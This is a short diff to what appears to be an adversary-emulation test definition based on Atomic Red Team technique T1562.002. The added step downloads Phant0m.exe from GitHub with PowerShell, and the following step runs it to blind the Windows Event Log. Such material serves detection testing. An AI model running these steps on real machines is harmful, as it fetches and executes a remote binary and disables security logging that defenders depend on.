@@ -18,6 +18,13 @@ requirements:
     platforms:
         - os: windows
 steps:
+    - name: |
+        Phant0m.exe must exist on disk at specified location (#{file_name})
+      inline: |
+        if (Test-Path "#{file_name}") {exit 0} else {{New-Item -Type Directory (split-path "#{file_name}") -ErrorAction ignore | Out-Null
+        Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1562.002/bin/Phant0m.exe" -OutFile "#{file_name}" -UseBasicParsing
+        }}
+      executor: powershell
     - name: makes-eventlog-blind-with-phant0m
       inline: |
         "{{.Args.file_name}}"
